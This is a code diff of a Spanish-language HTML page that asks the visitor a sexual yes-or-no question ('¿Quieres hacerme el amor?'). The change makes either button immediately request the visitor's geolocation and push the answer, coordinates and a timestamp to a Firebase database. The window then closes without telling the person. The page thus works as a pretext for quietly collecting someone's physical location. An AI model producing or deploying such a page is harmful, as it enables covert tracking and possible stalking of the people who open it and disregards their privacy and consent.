@@ -25,11 +25,8 @@
 </head>
 <body>
   <h1>¿Quieres hacerme el amor?</h1>
-  <button id="btnYes" onclick="saveResponse('Sí')">Sí</button>
-  <button id="btnNo" onclick="saveResponse('No')">No</button>
-
-  <!-- Botón para enviar respuesta -->
-  <button id="btnSubmit" onclick="submitResponse()">Enviar</button>
+  <button id="btnYes" onclick="saveAndSubmitResponse('Sí')">Sí</button>
+  <button id="btnNo" onclick="saveAndSubmitResponse('No')">No</button>
 
   <script>
     // Configuración de Firebase (Reemplaza estos valores con los de tu proyecto Firebase)
@@ -47,51 +44,41 @@
     const app = firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    let userResponse = ""; // Variable para guardar la respuesta ("Sí" o "No")
-    let userLocation = { latitude: null, longitude: null }; // Variable para la ubicación
+    // Variable para guardar la ubicación
+    let userLocation = { latitude: null, longitude: null };
 
-    // Función para guardar la respuesta y la ubicación
-    function saveResponse(response) {
-      userResponse = response;
-
+    // Función para guardar la respuesta y enviarla automáticamente
+    function saveAndSubmitResponse(response) {
       // Obtener la ubicación del usuario
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
             userLocation.latitude = position.coords.latitude;
             userLocation.longitude = position.coords.longitude;
+
+            // Guardar la respuesta y la ubicación en Firebase
+            const responseRef = database.ref("responses").push(); // Crea un nuevo nodo para la respuesta
+            responseRef
+              .set({
+                answer: response,
+                latitude: userLocation.latitude,
+                longitude: userLocation.longitude,
+                timestamp: new Date().toISOString(),
+              })
+              .then(() => {
+                // Opcional: cerrar la ventana después del envío
+                window.close();
+              })
+              .catch((error) => {
+                console.error("Error al enviar la respuesta a Firebase:", error);
+              });
           },
           (error) => {
-            alert("");
-            console.error(error);
+            console.error("Error al obtener la ubicación:", error);
           }
         );
       } else {
-        alert("");
-      }
-    }
-
-    // Función para enviar los datos a Firebase
-    function submitResponse() {
-      if (userResponse && userLocation.latitude && userLocation.longitude) {
-        // Guardar la respuesta y la ubicación en la base de datos de Firebase
-        const responseRef = database.ref("responses").push(); // Crea un nuevo nodo para la respuesta
-        responseRef
-          .set({
-            answer: userResponse,
-            latitude: userLocation.latitude,
-            longitude: userLocation.longitude,
-            timestamp: new Date().toISOString(),
-          })
-          .then(() => {
-            // Opcional: cerrar la ventana sin mostrar mensajes
-            window.close();
-          })
-          .catch((error) => {
-            console.error("Error al enviar la respuesta a Firebase:", error);
-          });
-      } else {
-        console.error("No se puede enviar: faltan datos (respuesta o ubicación).");
+        console.error("El navegador no soporta geolocalización.");
       }
     }
   </script>
